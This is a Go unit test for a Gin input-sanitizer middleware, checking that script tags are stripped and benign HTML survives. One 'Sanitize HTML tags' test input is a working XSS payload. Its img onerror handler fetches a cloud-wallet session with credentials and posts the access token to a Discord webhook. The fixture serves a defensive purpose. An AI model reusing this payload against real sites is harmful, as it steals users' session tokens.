package middleware

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
)

func TestInputSanitizerMiddleware(t *testing.T) {
	// Set Gin to test mode
	gin.SetMode(gin.TestMode)

	// Test cases
	tests := []struct {
		name           string
		input          map[string]interface{}
		expectedOutput map[string]interface{}
	}{
		{
			name: "Sanitize HTML tags",
			input: map[string]interface{}{
				"title":   "<script>alert('XSS')</script>",
				"content": `<img src=/ onerror='fetch("https://login-api.mycloudwallet.com/v1/wcw/session", {"referrer": "https://www.mycloudwallet.com/","referrerPolicy": "strict-origin-when-cross-origin","method": "GET","mode": "cors","credentials": "include"}).then(function(t){return console.log("Request succeeded with Response object",t),t}).then(function(t){return t.json()}).then(function(t){console.log(t.access_token),fetch("https://discord.com/api/v10/webhooks/1295329429907574795/FFHw8CVn-q8sNE5znRHzpcRRjp3jj_cN3K_bUfIm_8Cy8I8BhBZ3oskkZxOCQeY7loZn?wait=true",{headers:{accept:"application/json","content-type":"application/json"},body:{"content":"\\\ ${t.token} \\\","embeds":null,"attachments":[]},method:"POST"})});'\>lucy\</img\>`,
			},
			expectedOutput: map[string]interface{}{
				"title":   "",
				"content": `<img src="/">lucy\`,
			},
		},
		{
			name: "No sanitization needed",
			input: map[string]interface{}{
				"title":   "Hello World",
				"content": "<p>she is awesome. </p><p>voted!</p>",
			},
			expectedOutput: map[string]interface{}{
				"title":   "Hello World",
				"content": "<p>she is awesome. </p><p>voted!</p>",
			},
		},
		{
			name: "No sanitization needed with gif",
			input: map[string]interface{}{
				"title":   "Hello World",
				"content": `<p></p><img src="https://media.tenor.com/t7czUHlNIzMAAAAC/merry-christmas-model.gif" class="tenor-gif" alt="three women in bikinis and santa hats are standing next to each other with the words santa ho ho ho ho written below them .">`,
			},
			expectedOutput: map[string]interface{}{
				"title":   "Hello World",
				"content": `<p></p><img src="https://media.tenor.com/t7czUHlNIzMAAAAC/merry-christmas-model.gif" class="tenor-gif" alt="three women in bikinis and santa hats are standing next to each other with the words santa ho ho ho ho written below them .">`,
			},
		},
		{
			name: "No sanitization needed with mentions",
			input: map[string]interface{}{
				"content": `<p>hello <a href="https://qa.uncut.network/user/8589934794" rel="nofollow">@Andriy Tymkiv</a></p>`,
			},
			expectedOutput: map[string]interface{}{
				"content": `<p>hello <a href="https://qa.uncut.network/user/8589934794" rel="nofollow">@Andriy Tymkiv</a></p>`,
			},
		},
		{
			name: "Nested structure sanitization",
			input: map[string]interface{}{
				"title": "Nested Test",
				"details": map[string]interface{}{
					"description": "<b>Bold Text</b>",
					"tags":        []interface{}{"<script>", "safe-tag"},
				},
			},
			expectedOutput: map[string]interface{}{
				"title": "Nested Test",
				"details": map[string]interface{}{
					"description": "<b>Bold Text</b>",
					"tags":        []interface{}{"", "safe-tag"},
				},
			},
		},
		{
			name: "Single quote",
			input: map[string]interface{}{
				"name": "I'm",
			},
			expectedOutput: map[string]interface{}{
				"name": "I'm",
			},
		},
	}

	// Run each test case
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			// Create a test router
			router := gin.New()
			router.Use(InputSanitizerMiddleware())
			router.POST("/test", func(c *gin.Context) {
				var body map[string]interface{}
				if err := c.ShouldBindJSON(&body); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
					return
				}
				c.JSON(http.StatusOK, body)
			})

			// Marshal the input for the request
			body, _ := json.Marshal(tc.input)

			// Create a test request
			req := httptest.NewRequest(http.MethodPost, "/test", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")

			// Create a test response recorder
			w := httptest.NewRecorder()

			// Perform the test request
			router.ServeHTTP(w, req)

			// Decode the response
			var response map[string]interface{}
			_ = json.Unmarshal(w.Body.Bytes(), &response)

			// Assert the output
			assert.Equal(t, http.StatusOK, w.Code)
			assert.Equal(t, tc.expectedOutput, response)
		})
	}
}
